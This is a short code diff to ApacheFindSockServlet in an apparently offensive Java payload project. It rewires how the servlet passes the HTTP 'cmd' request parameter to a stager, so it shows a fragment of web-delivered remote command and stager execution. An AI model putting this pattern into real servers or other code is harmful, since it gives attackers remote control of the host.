@@ -34,6 +34,8 @@
 
 package j2eepayload.servlet;
 
+import j2eepayload.dynstager.DynstagerSupport;
+
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -44,8 +46,6 @@ import java.nio.channels.SocketChannel;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
-
-import javapayload.stager.LocalTest;
 
 import javax.servlet.ServletException;
 import javax.servlet.ServletOutputStream;
@@ -246,7 +246,7 @@ public class ApacheFindSockServlet extends HttpServlet {
 		out.write(2);
 		out.flush();
 		try {
-			new LocalTest(in, out).bootstrap(request.getParameter("cmd").split(" "), false);
+			DynstagerSupport.run(in, out, request.getParameter("cmd").split(" "));
 		} catch (Exception ex) {
 			ex.printStackTrace(new PrintStream(out));
 			out.flush();
